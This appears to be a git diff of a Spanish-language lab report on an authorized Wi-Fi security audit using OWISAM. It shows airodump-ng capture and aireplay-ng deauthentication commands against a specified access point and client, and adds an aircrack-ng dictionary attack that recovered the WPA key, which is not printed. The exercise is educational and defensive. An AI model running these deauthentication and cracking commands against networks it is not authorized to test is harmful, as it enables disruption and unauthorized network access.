@@ -11,7 +11,7 @@
 <h2>3. Metodología</h2>
 <p>Se adopta OWISAM, <em>Open Wireless Security Assessment Methodology</em>, como referencia para reconocimiento, identificación de controles inalámbricos, captura autorizada y validación de autenticación. Referencia: <a href="https://www.owisam.org/">owisam.org</a>. El ejercicio es externo porque el auditor solo observa y prueba la superficie inalámbrica desde fuera del AP, sin acceso administrativo al router.</p>
 <h2>4. Preparación reproducible</h2>
-<p><strong>Parámetros de captura:</strong> BSSID del AP <code>82:18:48:75:E3:76</code>; MAC del cliente propio <code>7A:4C:91:2E:B7:08</code>. La plataforma y la interfaz inalámbrica están documentadas en <a href="../docs/hardware_software-laboratorio.md">hardware_software-laboratorio.md</a>.</p>
+<p><strong>Parámetros de captura:</strong> BSSID del AP <code>82:18:48:75:E3:76</code>; MAC del cliente propio <code>7A:4C:91:2E:B7:08</code>. La plataforma y la interfaz inalámbrica están documentadas en <a href="../docs/especificaciones%20de%20hardware%20y%20software%20para%20el%20laboratorio.md">especificaciones de hardware y software para el laboratorio</a>.</p>
 <h2>5. Ejecución</h2>
 <h3>5.1 Reconocimiento autorizado</h3>
 <pre>sudo airodump-ng wlan1mon
@@ -21,4 +21,10 @@
 <p>Con <code>sudo airodump-ng -c 11 --bssid 82:18:48:75:E3:76 wlan1 -w pruebared</code> corriendo, en otra ventana de la terminal se desautentica al cliente con <code>sudo aireplay-ng -0 9 -a 82:18:48:75:E3:76 -c 7A:4C:91:2E:B7:08 wlan1</code>.</p>
 <p>La captura se registra en <code>pruebared-01.cap</code> y se debe verificar la aparición de <code>WPA handshake</code> antes de detener el proceso.</p>
 <p>Captura asignada: <code>handshake-82-18-48-75-E3-76.cap</code>, con SSID <code>Best Games</code>. Conservar el archivo fuera de Git y registrar la aparición del mensaje <code>WPA handshake</code>.</p>
+<h2>6. Diccionario y validación</h2>
+<p>La generación del diccionario contextualizado se documenta en <a href="../docs/Diccionarios.md">Diccionarios.md</a>. La validación se realizó únicamente sobre la captura y el diccionario de esta práctica; ambos archivos se conservan fuera de Git.</p>
+<pre>aircrack-ng -w diccionario_bestgames_10m.txt handshake-82-18-48-75-E3-76.cap
+[00:00:02] 18384/10000000 keys tested (10675.90 k/s)
+</pre>
+<p><strong>Resultado:</strong> se confirmó la recuperación de la credencial mediante el diccionario de prueba. El valor no se reproduce por tratarse de información sensible.</p>
 </body></html>
